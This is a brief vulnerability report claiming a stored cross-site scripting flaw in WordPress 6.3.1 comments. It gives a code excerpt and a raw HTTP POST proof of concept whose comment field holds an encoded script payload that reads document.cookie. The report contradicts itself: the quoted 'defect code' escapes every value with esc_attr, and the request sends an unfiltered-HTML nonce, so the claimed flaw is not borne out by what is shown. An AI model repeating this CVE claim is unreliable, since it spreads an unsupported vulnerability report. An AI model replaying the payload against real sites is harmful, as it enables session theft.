# vul-cve
WordPress -XSS
 Vulnerability description: In WordPress 6.3.1 article comments, because there is no filtering of the incoming comment parameters, and there is no escape when outputting, the attacker only needs to have an editor's identity and above authenticated users. In the post comment area, you can post a message containing xss payload to further steal the super administrator's permissions to take over the entire system. 
 Affected version:<=6.3.1 
 Source code download address: wordpress.org/latest.zip 

 defect code :

 	<td><input type="text" name="newcomment_author" size="30" value="<?php echo esc_attr( $comment->comment_author ); ?>" id="name" /></td>
</tr>
<tr>
	<td class="first"><label for="email"><?php _e( 'Email' ); ?></label></td>
	<td>
		<input type="text" name="newcomment_author_email" size="30" value="<?php echo esc_attr( $comment->comment_author_email ); ?>" id="email" />
	</td>
</tr>
<tr>
	<td class="first"><label for="newcomment_author_url"><?php _e( 'URL' ); ?></label></td>
	<td>
		<input type="text" id="newcomment_author_url" name="newcomment_author_url" size="30" class="code" value="<?php echo esc_attr( $comment->comment_author_url ); ?>" />
	</td>



 POC:
 POST /wordpress/wp-comments-post.php HTTP/1.1
Host: localhost
Content-Length: 187
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/wordpress/2023/09/06/%e6%b5%8b%e8%af%95/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: comment_author_bbfa5b726c6b7a9cf3cda9370be3ee91=1http%3A%2F%2Flocalhost%2Fwordpress%2F2023%2F07%2F31%2Ftesting%2F; comment_author_email_bbfa5b726c6b7a9cf3cda9370be3ee91=2839549219%40qq.com; wp-settings-2=mfold%3Do%26libraryContent%3Dbrowse; wp-settings-time-2=1693292998; wp-settings-time-1=1693556844; wp-settings-1=mfold%3Do%26posts_list_mode%3Dlist%26libraryContent%3Dbrowse%26editor%3Dtinymce; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=demo%7C1694075537%7CbygcKHCU1FfgDbRfeOJE9aYpMr03PqN2bl9GqHodLiG%7C5bae49b530a956d198aa4760b847165a444f326ae2d92af98e577dee505d74d5; USER_NAME_COOKIE=admin; SID_1=aa141d36; mailpoet_subscriber=%7B%22subscriber_id%22%3A1%7D; mailpoet_page_view=%7B%22timestamp%22%3A1690903646%7D; PHPSESSID=i9fvb5g4ib54ti6brb1fks6f4l; _wsm_id_1_1fff=f747894a5c5e0ff8.1690537890.5.1693878021.1693878015; cookie_consent={"uuid":"e0216ac2-a197-4cb6-81d4-b1d6e0808a92","cookie_categories":[],"timestamp":1693965620}
Connection: close

comment=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%0D%0A&submit=%E5%8F%91%E8%A1%A8%E8%AF%84%E8%AE%BA&comment_post_ID=307&comment_parent=0&_wp_unfiltered_html_comment=a811ec86e5
